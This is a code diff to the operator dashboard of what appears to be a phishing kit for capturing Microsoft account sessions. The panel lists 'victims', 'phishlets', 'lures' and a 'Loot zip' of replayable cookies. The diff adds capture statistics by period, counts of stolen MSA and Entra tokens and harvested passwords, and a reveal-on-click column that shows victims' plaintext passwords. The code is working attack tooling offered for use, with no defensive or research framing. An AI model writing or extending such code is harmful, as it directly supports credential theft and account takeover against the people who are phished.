@@ -152,17 +152,42 @@
   }
   .secret {
     font-family: var(--mono); font-size: 12px; cursor: pointer;
-    background: var(--bg2); border: 1px solid var(--line); padding: 2px 8px; max-width: 240px;
+    background: var(--bg2); border: 1px solid var(--line); padding: 2px 8px; max-width: 160px;
     overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    display: inline-block; vertical-align: middle;
   }
-  .secret.hide { color: transparent; text-shadow: 0 0 6px rgba(240,235,227,.8); }
+  .secret.hide { color: transparent; filter: blur(5px); user-select: none; }
   .cookies-list { font-family: var(--mono); font-size: 12px; color: var(--mute); max-height: 140px; overflow: auto; border: 1px solid var(--line); padding: 8px; background: var(--bg2); }
   .cookies-list .strong { color: var(--copper); }
   .vstate { display: flex; align-items: center; gap: 10px; margin-top: 12px; flex-wrap: wrap; }
   .vstate input.notes { flex: 1; min-width: 180px; background: var(--bg2); border: 1px solid var(--line); padding: 6px 8px; border-radius: 2px; }
   .empty-insp { color: var(--faint); padding: 24px 4px; }
 
-  #urlsview, #settingsview, #luresview { padding: 12px 16px 40px; overflow: auto; flex: 1; }
+  #urlsview, #settingsview, #luresview, #dashview { padding: 12px 16px 40px; overflow: auto; flex: 1; }
+  .dash-head { display: flex; align-items: flex-end; justify-content: space-between; gap: 16px; flex-wrap: wrap; margin-bottom: 18px; }
+  .dash-head h2 { margin: 0; font-size: 20px; font-weight: 600; }
+  .dash-head .sub { margin: 4px 0 0; color: var(--mute); font-size: 13px; }
+  .periods { display: flex; gap: 6px; }
+  .dash-nums { display: grid; grid-template-columns: repeat(auto-fill, minmax(132px, 1fr)); gap: 16px 28px; margin-bottom: 22px; padding-bottom: 18px; border-bottom: 1px solid var(--line); }
+  .dash-nums .n { font-family: var(--display); font-size: 28px; line-height: 1; font-variant-numeric: tabular-nums; }
+  .dash-nums .l { color: var(--mute); font-size: 13px; margin-top: 4px; }
+  .dash-nums .d { font-size: 12px; color: var(--faint); margin-top: 3px; font-family: var(--mono); }
+  .dash-nums .d.up { color: var(--olive); }
+  .dash-nums .d.down { color: var(--bad); }
+  .dash-chart { margin-bottom: 22px; }
+  .cap { color: var(--mute); font-size: 13px; margin-bottom: 8px; }
+  .bars { display: flex; align-items: flex-end; gap: 3px; height: 140px; }
+  .bars .col { flex: 1; min-width: 0; height: 100%; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; }
+  .bars .stack { width: 100%; max-width: 26px; height: 118px; display: flex; flex-direction: column; justify-content: flex-end; }
+  .bars .b-all, .bars .b-ok { width: 100%; min-height: 0; }
+  .bars .b-all { background: #3d372f; }
+  .bars .b-ok { background: var(--copper); }
+  .bars .lab { font-size: 10px; color: var(--faint); margin-top: 5px; font-family: var(--mono); white-space: nowrap; overflow: hidden; max-width: 100%; }
+  .kind-split { display: flex; height: 7px; background: var(--line); margin: 6px 0 14px; max-width: 420px; }
+  .kind-split .msa { background: var(--copper); }
+  .kind-split .entra { background: var(--olive); }
+  .dash-two { display: grid; grid-template-columns: 1fr 1fr; gap: 28px; }
+  @media (max-width: 860px) { .dash-two { grid-template-columns: 1fr; } }
   .urlbar { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 12px; }
   .urlbar input { background: var(--bg2); border: 1px solid var(--line); padding: 7px 10px; border-radius: 2px; min-width: 280px; flex: 1; }
   .urlrow { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--line); }
@@ -235,6 +260,7 @@
 </header>
 
 <nav class="rail">
+  <button type="button" data-tab="dash"></button>
   <button type="button" class="on" data-tab="victims"></button>
   <button type="button" data-tab="sessions"></button>
   <button type="button" data-tab="lures"></button>
@@ -260,6 +286,7 @@
     </div>
     <aside class="inspector" id="inspector"></aside>
   </div>
+  <div id="dashview" hidden></div>
   <div id="urlsview" hidden></div>
   <div id="settingsview" hidden></div>
   <div id="luresview" hidden></div>
@@ -283,7 +310,7 @@ const I18N = {
   en: {
     search_ph:"user, IP, token…", refresh:"Refresh", auto:"Live", loot:"Loot zip", csv:"CSV",
     loot_t:"Cookies of every replayable account", csv_t:"Masked session CSV for the report",
-    tab_victims:"Accounts", tab_sessions:"Captures", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Settings",
+    tab_dash:"Dashboard", tab_victims:"Accounts", tab_sessions:"Captures", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Settings",
     domains:"Hosts", all_phishlets:"All phishlets", only_valid:"Replayable only", show_noise:"Include visits with no login",
     th_user:"Account", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
     th_lastip:"IP", th_seen:"Seen", th_pass:"Password", th_captured:"Captured",
@@ -317,13 +344,22 @@ const I18N = {
     ago:(n,u)=>`${n}${u} ago`,
     facts:(p,r,h,st,last)=>`${p} accounts · <b>${r} replayable</b> · ${h} captures · ${st} · ${last}`,
     help_title:"Keys",
-    help_items:[["/","search"],["1–5","switch view"],["j k","move"],["c","copy cookies"],["r","refresh"],["?","this list"],["esc","close"]],
+    help_items:[["/","search"],["1–6","switch view"],["j k","move"],["c","copy cookies"],["r","refresh"],["?","this list"],["esc","close"]],
     tokens:"Tokens", password:"Password", copy_user:"Copy account",
+    reveal_ph:"Click to show / hide",
+    period_day:"Day", period_week:"Week", period_month:"Month",
+    dash_day:"Today", dash_week:"This week", dash_month:"This month",
+    vs_day:"vs yesterday", vs_week:"vs previous week", vs_month:"vs previous month",
+    m_captures:"Captures", m_accounts:"Accounts", m_replay:"Replayable", m_passwords:"With password",
+    m_msa:"MSA", m_entra:"Entra", m_noise:"No login",
+    chart_day:"Captures by hour", chart_week:"Captures by day", chart_month:"Captures by day",
+    chart_hint:"Copper = replayable. Grey = the rest.",
+    kind_mix:"Token mix", by_phishlet:"By phishlet", no_period:"Nothing in this period.",
   },
   es: {
     search_ph:"cuenta, IP, token…", refresh:"Actualizar", auto:"En vivo", loot:"Loot zip", csv:"CSV",
     loot_t:"Cookies de cada cuenta rejugable", csv_t:"CSV enmascarado para el informe",
-    tab_victims:"Cuentas", tab_sessions:"Capturas", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Ajustes",
+    tab_dash:"Dashboard", tab_victims:"Cuentas", tab_sessions:"Capturas", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Ajustes",
     domains:"Hosts", all_phishlets:"Todos los phishlets", only_valid:"Solo rejugables", show_noise:"Incluir visitas sin login",
     th_user:"Cuenta", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
     th_lastip:"IP", th_seen:"Visto", th_pass:"Password", th_captured:"Capturado",
@@ -357,8 +393,17 @@ const I18N = {
     ago:(n,u)=>`hace ${n}${u}`,
     facts:(p,r,h,st,last)=>`${p} cuentas · <b>${r} rejugables</b> · ${h} capturas · ${st} · ${last}`,
     help_title:"Teclas",
-    help_items:[["/","buscar"],["1–5","cambiar vista"],["j k","mover"],["c","copiar cookies"],["r","actualizar"],["?","esta lista"],["esc","cerrar"]],
+    help_items:[["/","buscar"],["1–6","cambiar vista"],["j k","mover"],["c","copiar cookies"],["r","actualizar"],["?","esta lista"],["esc","cerrar"]],
     tokens:"Tokens", password:"Password", copy_user:"Copiar cuenta",
+    reveal_ph:"Clic para ver / ocultar",
+    period_day:"Día", period_week:"Semana", period_month:"Mes",
+    dash_day:"Hoy", dash_week:"Esta semana", dash_month:"Este mes",
+    vs_day:"vs ayer", vs_week:"vs semana anterior", vs_month:"vs mes anterior",
+    m_captures:"Capturas", m_accounts:"Cuentas", m_replay:"Rejugables", m_passwords:"Con password",
+    m_msa:"MSA", m_entra:"Entra", m_noise:"Sin login",
+    chart_day:"Capturas por hora", chart_week:"Capturas por día", chart_month:"Capturas por día",
+    chart_hint:"Cobre = rejugable. Gris = el resto.",
+    kind_mix:"Mezcla de tokens", by_phishlet:"Por phishlet", no_period:"Nada en este periodo.",
   }
 };
 
@@ -373,7 +418,7 @@ function t(k) { const v = (I18N[LANG] && I18N[LANG][k]) ?? I18N.en[k]; return v 
 const state = {
   raw: [], tab: 'victims', q: '', phishlet: '', onlyValid: false, showNoise: false,
   sort: { key: 'update', dir: -1 }, auto: false, timer: null, knownIds: new Set(), firstLoad: true, sig: '',
-  sel: null, rows: [],
+  sel: null, rows: [], revealed: new Set(), period: 'week',
 };
 const $ = s => document.querySelector(s);
 const esc = s => (s == null ? '' : String(s)).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
@@ -408,6 +453,7 @@ function applyStatic() {
   $('#loot').textContent = t('loot'); $('#loot').title = t('loot_t');
   $('#csv').textContent = t('csv'); $('#csv').title = t('csv_t');
   $('#langbtn').textContent = LANG === 'en' ? 'ES' : 'EN';
+  document.querySelector('[data-tab="dash"]').textContent = t('tab_dash');
   document.querySelector('[data-tab="victims"]').textContent = t('tab_victims');
   document.querySelector('[data-tab="sessions"]').textContent = t('tab_sessions');
   document.querySelector('[data-tab="lures"]').textContent = t('tab_lures');
@@ -439,7 +485,15 @@ function victims() {
       if (better) v.best = s;
     }
   }
-  return [...m.values()].map(v => ({ ...v, phishlets: [...v.phishlets], kind: v.best && v.best.kind, persistent: v.best && v.best.persistent, cookies: v.best ? v.best.cookies : 0 }));
+  return [...m.values()].map(v => {
+    const pw = (v.best && v.best.password) || v.password || (v.sessions.find(s => s.password) || {}).password || '';
+    return { ...v, phishlets: [...v.phishlets], kind: v.best && v.best.kind, persistent: v.best && v.best.persistent, cookies: v.best ? v.best.cookies : 0, password: pw };
+  });
+}
+function passCell(pw, key) {
+  if (!pw) return '<span class="mut">—</span>';
+  const on = state.revealed.has(key);
+  return `<span class="secret${on ? '' : ' hide'}" data-reveal="${esc(key)}" title="${t('reveal_ph')}">${esc(pw)}</span>`;
 }
 function noiseCount() { return state.raw.filter(s => !(s.username || '').trim()).length; }
 
@@ -477,16 +531,164 @@ function render() {
   const isTable = tab === 'victims' || tab === 'sessions';
   $('#toolbar').style.display = isTable ? '' : 'none';
   $('#stage').style.display = isTable ? '' : 'none';
+  $('#dashview').hidden = tab !== 'dash';
   $('#urlsview').hidden = tab !== 'urls';
   $('#settingsview').hidden = tab !== 'settings';
   $('#luresview').hidden = tab !== 'lures';
   renderFacts();
+  if (tab === 'dash') { renderDash(); return; }
   if (tab === 'urls') { renderUrls(); return; }
   if (tab === 'settings') { renderSettings(); return; }
   if (tab === 'lures') { renderLures(); return; }
   $('#fnoisewrap').style.display = tab === 'sessions' ? '' : 'none';
   if (tab === 'victims') renderVictims(); else renderSessions();
   renderInspector();
+}
+
+function periodBounds(kind, now) {
+  const end = now || new Date();
+  const start = new Date(end);
+  start.setHours(0, 0, 0, 0);
+  const prevStart = new Date(start);
+  const prevEnd = new Date(end);
+  if (kind === 'week') {
+    start.setDate(start.getDate() - ((start.getDay() + 6) % 7));
+    prevStart.setTime(start.getTime());
+    prevStart.setDate(prevStart.getDate() - 7);
+    prevEnd.setDate(prevEnd.getDate() - 7);
+  } else if (kind === 'month') {
+    start.setDate(1);
+    prevStart.setTime(start.getTime());
+    prevStart.setMonth(prevStart.getMonth() - 1);
+    prevEnd.setMonth(prevEnd.getMonth() - 1);
+  } else {
+    prevStart.setDate(prevStart.getDate() - 1);
+    prevEnd.setDate(prevEnd.getDate() - 1);
+  }
+  return { start, end, prevStart, prevEnd };
+}
+function inRange(ts, a, b) {
+  if (!ts) return false;
+  const ms = ts * 1000;
+  return ms >= a.getTime() && ms < b.getTime();
+}
+function summarize(list) {
+  const users = new Set(), replayUsers = new Set();
+  let captures = 0, replay = 0, creds = 0, msa = 0, entra = 0, noise = 0;
+  const phl = new Map();
+  for (const s of list) {
+    captures++;
+    const u = (s.username || '').trim().toLowerCase();
+    if (!u) noise++; else users.add(u);
+    if (s.valid) { replay++; if (u) replayUsers.add(u); }
+    if (s.password) creds++;
+    if (s.kind === 'msa') msa++;
+    if (s.kind === 'entra') entra++;
+    const p = s.phishlet || '?';
+    const e = phl.get(p) || { name: p, n: 0, valid: 0 };
+    e.n++; if (s.valid) e.valid++;
+    phl.set(p, e);
+  }
+  return { captures, noise, users: users.size, replay, replayUsers: replayUsers.size, creds, msa, entra, phl: [...phl.values()].sort((a, b) => b.valid - a.valid || b.n - a.n) };
+}
+function delta(cur, prev) {
+  const n = cur - prev;
+  if (n === 0) return { n: 0, cls: '', txt: '0' };
+  const sign = n > 0 ? '+' : '';
+  return { n, cls: n > 0 ? 'up' : 'down', txt: sign + n };
+}
+function chartBuckets(kind, start, end, sessions) {
+  const out = [];
+  if (kind === 'day') {
+    for (let h = 0; h < 24; h++) {
+      const a = new Date(start); a.setHours(h, 0, 0, 0);
+      const b = new Date(a); b.setHours(h + 1);
+      if (a >= end) break;
+      out.push({ label: h % 3 === 0 ? String(h).padStart(2, '0') : '', start: a, end: b });
+    }
+  } else {
+    const a = new Date(start); a.setHours(0, 0, 0, 0);
+    while (a < end) {
+      const b = new Date(a); b.setDate(b.getDate() + 1);
+      const lab = a.toLocaleDateString(LANG === 'es' ? 'es-ES' : 'en-US', kind === 'week'
+        ? { weekday: 'short', day: 'numeric' }
+        : { day: 'numeric' });
+      out.push({ label: lab, start: new Date(a), end: b });
+      a.setDate(a.getDate() + 1);
+    }
+  }
+  return out.map(b => {
+    const hits = sessions.filter(s => inRange(s.update || s.create, b.start, b.end));
+    return { label: b.label, n: hits.length, valid: hits.filter(s => s.valid).length };
+  });
+}
+function renderDash() {
+  const kind = state.period || 'week';
+  const { start, end, prevStart, prevEnd } = periodBounds(kind, new Date());
+  const curList = state.raw.filter(s => inRange(s.update || s.create, start, end));
+  const prevList = state.raw.filter(s => inRange(s.update || s.create, prevStart, prevEnd));
+  const cur = summarize(curList);
+  const prev = summarize(prevList);
+  const loc = LANG === 'es' ? 'es-ES' : 'en-US';
+  const rangeTxt = start.toLocaleDateString(loc, { day: 'numeric', month: 'short' }) + ' – ' + end.toLocaleDateString(loc, { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' });
+  const vs = t('vs_' + kind);
+  const metric = (label, now, then) => {
+    const d = delta(now, then);
+    return `<div><div class="n">${now}</div><div class="l">${label}</div><div class="d ${d.cls}">${d.txt} ${vs}</div></div>`;
+  };
+  const buckets = chartBuckets(kind, start, end, state.raw);
+  const max = Math.max(1, ...buckets.map(b => b.n));
+  const bars = buckets.map(b => {
+    const hAll = Math.round((b.n / max) * 100);
+    const hOk = b.n ? Math.round((b.valid / b.n) * hAll) : 0;
+    const rest = Math.max(0, hAll - hOk);
+    return `<div class="col" title="${esc(b.label)}: ${b.n} / ${b.valid} ${t('m_replay')}">
+      <div class="stack"><div class="b-ok" style="height:${hOk}%"></div><div class="b-all" style="height:${rest}%"></div></div>
+      <div class="lab">${esc(b.label)}</div>
+    </div>`;
+  }).join('');
+  const mix = cur.msa + cur.entra;
+  const msaPct = mix ? Math.round(cur.msa / mix * 100) : 0;
+  const entraPct = mix ? 100 - msaPct : 0;
+  const phlRows = cur.phl.length ? cur.phl.map(p =>
+    `<tr><td class="phl">${esc(p.name)}</td><td class="num">${p.n}</td><td class="num">${p.valid}</td><td class="num">${p.n ? Math.round(p.valid / p.n * 100) : 0}%</td></tr>`
+  ).join('') : `<tr><td colspan="4" class="empty">${t('no_period')}</td></tr>`;
+  $('#dashview').innerHTML = `
+    <div class="dash-head">
+      <div>
+        <h2>${t('dash_' + kind)}</h2>
+        <p class="sub">${esc(rangeTxt)}</p>
+      </div>
+      <div class="periods">
+        <button type="button" class="btn ${kind === 'day' ? 'on' : ''}" data-period="day">${t('period_day')}</button>
+        <button type="button" class="btn ${kind === 'week' ? 'on' : ''}" data-period="week">${t('period_week')}</button>
+        <button type="button" class="btn ${kind === 'month' ? 'on' : ''}" data-period="month">${t('period_month')}</button>
+      </div>
+    </div>
+    <div class="dash-nums">
+      ${metric(t('m_captures'), cur.captures, prev.captures)}
+      ${metric(t('m_accounts'), cur.users, prev.users)}
+      ${metric(t('m_replay'), cur.replayUsers, prev.replayUsers)}
+      ${metric(t('m_passwords'), cur.creds, prev.creds)}
+      ${metric(t('m_msa'), cur.msa, prev.msa)}
+      ${metric(t('m_entra'), cur.entra, prev.entra)}
+    </div>
+    <div class="dash-chart">
+      <div class="cap">${t('chart_' + kind)} <span class="mut">· ${t('chart_hint')}</span></div>
+      ${cur.captures ? `<div class="bars">${bars}</div>` : `<div class="empty">${t('no_period')}</div>`}
+    </div>
+    <div class="dash-two">
+      <div>
+        <div class="cap">${t('kind_mix')}</div>
+        <div class="kind-split">${mix ? `<span class="msa" style="width:${msaPct}%"></span><span class="entra" style="width:${entraPct}%"></span>` : ''}</div>
+        <div class="mut">${cur.msa} ${t('m_msa')} · ${cur.entra} ${t('m_entra')} · ${cur.noise} ${t('m_noise')}</div>
+      </div>
+      <div>
+        <div class="cap">${t('by_phishlet')}</div>
+        <table><thead><tr><th>${t('th_phishlet')}</th><th>${t('m_captures')}</th><th>${t('m_replay')}</th><th>%</th></tr></thead>
+        <tbody>${phlRows}</tbody></table>
+      </div>
+    </div>`;
 }
 
 function renderLures() {
@@ -530,11 +732,11 @@ function th(cols) {
 function renderVictims() {
   const all = victims();
   const filtered = applyFilter(all, v => v.username, v => v.phishlets);
-  const getters = { user: v => v.username, phishlet: v => v.phishlets.join(','), valid: v => v.valid ? 1 : 0, cookies: v => v.cookies, attempts: v => v.sessions.length, update: v => v.lastUpdate };
+  const getters = { user: v => v.username, pass: v => v.password || '', phishlet: v => v.phishlets.join(','), valid: v => v.valid ? 1 : 0, cookies: v => v.cookies, attempts: v => v.sessions.length, update: v => v.lastUpdate };
   const rows = sortList(filtered, getters);
   state.rows = rows.map(v => ({ type: 'victim', key: v.username.toLowerCase(), data: v }));
   $('#thead').innerHTML = th([
-    ['user', t('th_user'), true], ['phishlet', t('th_phishlet'), true], ['valid', t('th_loot'), true],
+    ['user', t('th_user'), true], ['pass', t('th_pass'), true], ['phishlet', t('th_phishlet'), true], ['valid', t('th_loot'), true],
     ['cookies', t('th_cookies'), true], ['attempts', t('th_attempts'), true], ['', t('th_lastip'), false], ['update', t('th_seen'), true]
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(v => {
@@ -543,6 +745,7 @@ function renderVictims() {
     const sel = state.sel && state.sel.type === 'victim' && state.sel.key === v.username.toLowerCase();
     return `<tr data-sel="victim:${esc(v.username.toLowerCase())}" class="${sel ? 'sel' : ''}">
       <td class="u">${esc(v.username)}</td>
+      <td>${passCell(v.password, 'v:' + v.username.toLowerCase())}</td>
       <td class="phl">${v.phishlets.map(esc).join(', ')}</td>
       <td>${kindCell(v.best)}${vst.used ? `<span class="mark">${t('used')}</span>` : ''}${ips.size > 1 ? `<span class="mark" title="${t('mip_title')(ips.size)}">${ips.size} IPs</span>` : ''}</td>
       <td class="num">${v.cookies}</td>
@@ -550,7 +753,7 @@ function renderVictims() {
       <td class="mut">${esc(v.lastIP)}</td>
       <td class="mut" title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
     </tr>`;
-  }).join('') : `<tr><td colspan="7" class="empty">${t('empty_victims')}</td></tr>`;
+  }).join('') : `<tr><td colspan="8" class="empty">${t('empty_victims')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('victims_l')}`;
   if (!state.sel && rows[0]) state.sel = { type: 'victim', key: rows[0].username.toLowerCase() };
 }
@@ -559,11 +762,11 @@ function renderSessions() {
   let all = state.raw.slice();
   if (!state.showNoise) all = all.filter(s => (s.username || '').trim());
   const filtered = applyFilter(all, s => s.username, s => s.phishlet);
-  const getters = { id: s => s.id, phishlet: s => s.phishlet, user: s => s.username || '', valid: s => s.valid ? 1 : 0, cookies: s => s.cookies, update: s => s.update };
+  const getters = { id: s => s.id, phishlet: s => s.phishlet, user: s => s.username || '', pass: s => s.password || '', valid: s => s.valid ? 1 : 0, cookies: s => s.cookies, update: s => s.update };
   const rows = sortList(filtered, getters);
   state.rows = rows.map(s => ({ type: 'session', key: String(s.id), data: s }));
   $('#thead').innerHTML = th([
-    ['id', '#', true], ['phishlet', t('th_phishlet'), true], ['user', t('th_user'), true], ['', t('th_pass'), false],
+    ['id', '#', true], ['phishlet', t('th_phishlet'), true], ['user', t('th_user'), true], ['pass', t('th_pass'), true],
     ['valid', t('th_loot'), true], ['cookies', t('th_cookies'), true], ['', t('th_lastip'), false], ['update', t('th_captured'), true]
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(s => {
@@ -572,7 +775,7 @@ function renderSessions() {
       <td class="num">${s.id}</td>
       <td class="phl">${esc(s.phishlet)}</td>
       <td>${esc(s.username) || '<span class="mut">—</span>'}</td>
-      <td>${s.password ? '·' : '<span class="mut">—</span>'}</td>
+      <td>${passCell(s.password, 's:' + s.id)}</td>
       <td>${kindCell(s)}</td>
       <td class="num">${s.cookies}</td>
       <td class="mut">${esc(s.remote_addr)}</td>
@@ -620,7 +823,7 @@ function renderInspector() {
           <span class="num">${s.cookies}</span>
           <span class="mut">${esc(s.remote_addr)}</span>
           <span class="mut" title="${absTime(s.update)}">${relTime(s.update)}</span>
-          ${s.password ? `<span class="secret hide" data-reveal>${esc(s.password)}</span>` : ''}
+          ${s.password ? passCell(s.password, 's:' + s.id) : ''}
           ${s.cookies ? `<button class="btn" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}
         </div>`).join('')}</div>
       <div class="cookies-list" id="ckbox" hidden></div>
@@ -651,7 +854,7 @@ function renderInspector() {
     </div>
     <div class="meta-grid">
       <div><div class="k">${t('tokens')}</div><div class="v">${(s.tokens && s.tokens.length) ? s.tokens.map(esc).join(', ') : '—'}</div></div>
-      <div><div class="k">${t('password')}</div><div class="v">${s.password ? `<span class="secret hide" data-reveal>${esc(s.password)}</span>` : '—'}</div></div>
+      <div><div class="k">${t('password')}</div><div class="v">${passCell(s.password, 's:' + s.id)}</div></div>
       <div><div class="k">${t('useragent')}</div><div class="v">${esc(s.useragent)}</div></div>
       <div><div class="k">${t('landing')}</div><div class="v">${esc(s.landing)}</div></div>
     </div>
@@ -828,8 +1031,18 @@ document.addEventListener('click', e => {
   if (curl) { navigator.clipboard.writeText(curl.dataset.copyurl).then(() => toast(t('url_copied'))).catch(err => toast(t('error') + ': ' + err)); return; }
   const del = e.target.closest('[data-delurl]');
   if (del) { if (!confirm(t('confirm_del'))) return; fetch('/api/urls?url=' + encodeURIComponent(del.dataset.delurl), { method: 'DELETE' }).then(refreshUrlList); return; }
+  const per = e.target.closest('[data-period]');
+  if (per) { state.period = per.dataset.period; render(); return; }
   const reveal = e.target.closest('[data-reveal]');
-  if (reveal) { reveal.classList.toggle('hide'); return; }
+  if (reveal) {
+    reveal.classList.toggle('hide');
+    const k = reveal.dataset.reveal;
+    if (k) {
+      if (reveal.classList.contains('hide')) state.revealed.delete(k);
+      else state.revealed.add(k);
+    }
+    return;
+  }
   const tab = e.target.closest('[data-tab]');
   if (tab && tab.closest('.rail')) { state.tab = tab.dataset.tab; state.sel = null; render(); return; }
   const tr = e.target.closest('tbody tr[data-sel]');
@@ -863,8 +1076,8 @@ document.addEventListener('keydown', e => {
   if (e.key === 'c') { const id = selectedCopyId(); if (id) copyCookies(id); return; }
   if (e.key === 'j' || e.key === 'ArrowDown') { e.preventDefault(); moveSel(1); return; }
   if (e.key === 'k' || e.key === 'ArrowUp') { e.preventDefault(); moveSel(-1); return; }
-  if (e.key >= '1' && e.key <= '5') {
-    state.tab = ['victims', 'sessions', 'lures', 'urls', 'settings'][+e.key - 1];
+  if (e.key >= '1' && e.key <= '6') {
+    state.tab = ['dash', 'victims', 'sessions', 'lures', 'urls', 'settings'][+e.key - 1];
     state.sel = null; render();
   }
 });
